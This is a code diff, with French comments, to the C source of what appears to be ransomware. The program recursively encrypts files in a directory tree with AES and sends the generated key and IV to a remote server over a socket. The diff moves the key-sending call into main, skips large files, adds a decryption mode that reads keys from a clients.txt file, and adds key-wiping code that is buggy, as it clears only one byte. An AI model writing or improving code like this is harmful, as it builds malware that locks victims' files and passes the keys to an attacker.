@@ -13,9 +13,11 @@
 
 #define OPENSSL_KEY_SIZE (256 / 8) //car Rand_bytes génère des bytes (octets) et pas bits
 #define OPENSSL_IV_SIZE (128 / 8)
+#define MAX_FILE_SIZE 1000000 //1Mb max
 #define SIZE 1024
 
 void usage();
+int file_too_big(char *filename);
 int is_encrypted(char *path);
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
@@ -43,6 +45,22 @@ void usage(void){
 
     printf("exemples of listening :\n\n");
     printf("    -d -f {root folder of the tree} -k {key} -v {initialisation vector}\n\n");
+}
+
+int file_too_big(char *filename){
+	FILE* file = fopen(filename, "r");
+
+	//Va à la fin du fichier et calcul son volume
+	fseek(file, 0L, SEEK_END);
+	long int result = ftell(file);
+
+	if(result >= MAX_FILE_SIZE){
+		return 1;
+	}
+
+	return 0;
+
+	fclose(file);
 }
 
 int is_encrypted(char *path){
@@ -81,9 +99,12 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			}
 			listdir(path, iv, key, de_flag);
 		}
-		//If file and not dir
+		//Si fichier et non directory
 		else{
 			if(de_flag == 'c'){
+				if(file_too_big(path) == 1){
+					continue;
+				}
 				if(is_encrypted(path) == 1){
 					printf("%s\n", path);
 					continue;
@@ -124,8 +145,6 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 
 	bytes_to_hexa(key, pKey, OPENSSL_KEY_SIZE + 1);
 	bytes_to_hexa(iv, pIv, OPENSSL_IV_SIZE + 1);
-
-	send_key(pKey, pIv);
 }
 
 int send_key(char *pKey, char *pIv){
@@ -147,6 +166,11 @@ int send_key(char *pKey, char *pIv){
 	printf("Connected on %s:%d\n", inet_ntoa(server_addr.sin_addr), server_addr.sin_port);
 
 	send(sockid, (const char *)msg, strlen(msg), 0);
+	
+	//suppression de la cléf et de l'IV de la mémoire
+	memset(msg, 0, sizeof(char));
+	memset(pKey, 0, sizeof(char));
+	memset(pIv, 0, sizeof(char));
 }
 
 int main (int argc, char * argv[]){
@@ -163,7 +187,12 @@ int main (int argc, char * argv[]){
         if(strcmp(argv[1], "-c") == 0){
             if(strcmp(argv[2], "-f") == 0){
 				generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
+				send_key(pKey, pIv);
 				listdir(argv[3], iv, key, 'c');
+
+				//suppression de la cléf et de l'IV de la mémoire
+				memset(iv, 0, sizeof(char));
+				memset(key, 0, sizeof(char));
 			}
 			else{
 				printf("Argument is missing !");
@@ -171,13 +200,30 @@ int main (int argc, char * argv[]){
         }
         else if(strcmp(argv[1], "-d") == 0){
             if(strcmp(argv[2], "-f") == 0){
-				if(strcmp(argv[4], "-k") == 0){
-					if(strcmp(argv[6], "-v") == 0){
+				if(	strcmp(argv[4], "-k") == 0 && strcmp(argv[6], "-v") == 0 && 
+					strlen(argv[3]) > 0 && strlen(argv[5]) > 0 && strlen(argv[7]) > 0){
 						listdir(argv[3], argv[7], argv[5], 'd');
+				}
+				else if(strcmp(argv[4], "-a") == 0 && strlen(argv[3]) > 0){
+					char token_list[2][(OPENSSL_KEY_SIZE * 2) + 3];
+					char buffer[SIZE];
+					int i = 0;
+
+					FILE* key_file = fopen("clients.txt", "r");
+					fgets(buffer, SIZE, key_file);
+
+					char *token = strtok(buffer, " | ");
+					while(token != NULL){
+						if(i > 0){
+							strcpy(token_list[i - 1], token);
+						}
+						i++;
+
+						token = strtok(NULL, " | ");
 					}
-					else{
-						printf("Argument is missing !");
-					}
+					fclose(key_file);
+
+					listdir(argv[3], token_list[1], token_list[0], 'd');
 				}
 				else{
 					printf("Argument is missing !");
